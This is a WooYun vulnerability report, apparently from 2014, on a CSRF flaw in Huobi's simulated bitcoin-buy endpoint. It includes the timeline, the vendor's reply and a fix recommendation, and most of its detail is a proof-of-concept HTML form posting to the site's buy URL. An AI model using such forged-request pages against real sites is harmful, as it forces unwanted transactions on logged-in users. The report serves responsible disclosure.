{"id": 50448, "wybug_id": "wooyun-2014-077794", "wybug_title": "火币网买卖比特币模拟交易CSRF漏洞", "wybug_corp": "huobi.com", "wybug_author": "路人甲", "wybug_date": "2014-09-29 17:06", "wybug_open_date": "2014-11-13 17:08", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向公众公开  简要描述： 登陆火币网之后，在本地创建html表单，form的action设置为火币网买入比特币url，提交表单，成功扣除余额 详细说明：  \n<!DOCTYPE html><html lang=\"en\"><head>  <meta charset=\"UTF-8\">  <title>CSRF Hijack</title></head><body>  <form id=\"form_add_buy_btc\" class=\"form-horizontal\" method=\"post\" action=\"https://s.huobi.com/?a=do_buy\">  <div class=\"control-group\">    <label class=\"control-label tx-red\" for=\"zuijiamaijia\">最佳买价：</label>    <div class=\"controls\">      <label id=\"zuijiamaijia\" class=\"tx-red\" onclick=\"$('#form_add_buy_btc #mairujia').val($(this).html());$('#form_add_buy_btc #mairujia').trigger('change');\">2299.2</label><span class=\"help-inline\">CNY/BTC</span>    </div>  </div>  <div class=\"control-group\">    <label class=\"control-label tx-red\" for=\"dangqianyue\">当前余额：</label>    <div class=\"controls\">      <label id=\"dangqianyue\" class=\"tx-red\">100000.00</label><span class=\"help-inline\">CNY</span>    </div>  </div>  <div class=\"control-group\">    <label class=\"control-label tx-red\" for=\"kemairuliang\">可买入量：</label>    <div class=\"controls\">      <label id=\"kemairuliang\" class=\"tx-red\">43.4782</label><span class=\"help-inline\">BTC</span>    </div>  </div>  <div class=\"control-group\">    <label class=\"control-label\" for=\"mairujia\">买入价：</label>    <div class=\"controls\">      <div class=\"mairujiaformError parentFormform_add_buy_btc formError formError-small\" style=\"opacity: 0.87; position: absolute; top: 445px; left: 611.5px; margin-top: -35px;\"><div class=\"formErrorContent\">* 此处不可空白<br></div><div class=\"formErrorArrow\"><div class=\"line10\"><!-- --></div><div class=\"line9\"><!-- --></div><div class=\"line8\"><!-- --></div><div class=\"line7\"><!-- --></div><div class=\"line6\"><!-- --></div><div class=\"line5\"><!-- --></div><div class=\"line4\"><!-- --></div><div class=\"line3\"><!-- --></div><div class=\"line2\"><!-- --></div><div class=\"line1\"><!-- --></div></div></div><input class=\"validate[required,ajax[ajax_st_check_buy_price]] text-input \" name=\"price\" type=\"text\" id=\"mairujia\" placeholder=\"\"><span class=\"help-inline\">CNY/BTC</span>    </div>  </div>  <div class=\"control-group\">    <label class=\"control-label\" for=\"mairuliang\">买入量：</label>    <div class=\"controls\">      <input class=\"validate[required,ajax[ajax_st_check_buy_volume]] text-input \" name=\"amount\" type=\"text\" id=\"mairuliang\" placeholder=\"\"><span class=\"help-inline\">BTC</span>    </div>  </div>  <div class=\"control-group\">    <label class=\"control-label\" for=\"duihuane\">交易额：</label>    <div class=\"controls\">      <input class=\"validate[required] text-input \" type=\"text\" id=\"duihuane\" placeholder=\"\"><span class=\"help-inline\">CNY</span>    </div>  </div>  <div class=\"control-group hidden\">    <label class=\"control-label\" for=\"shouxufei\">手续费：</label>    <div class=\"controls\">      <input class=\"validate[required] text-input \" type=\"text\" id=\"shouxufei\" placeholder=\"\">      <span class=\"help-inline\">CNY&nbsp;&nbsp;<span class=\"text-success\">(<span class=\"user_fee_rate\">0</span>%)</span></span>    </div>  </div>  <div class=\"control-group\">    <button type=\"submit\" class=\" buy_btn\">买入 （BTC-CNY）</button>  </div></form></body></html>\n   漏洞证明：  之前的状态：\n\n漏洞表单：\n\n提交表单后跳转到火币网页面并成功扣除余额：\n\n   修复方案：  建议为每笔交易加上token或者验证，因为正式场景下也并没有任何验证，如果恶意页面和火币网页面一起打开并且用户登录了火币网则后果不堪设想   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-09-30 01:46 厂商回复： CSRF模拟交易意义不大，正式环境不受影响。不过既然作者提醒了，就准备修复一下 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}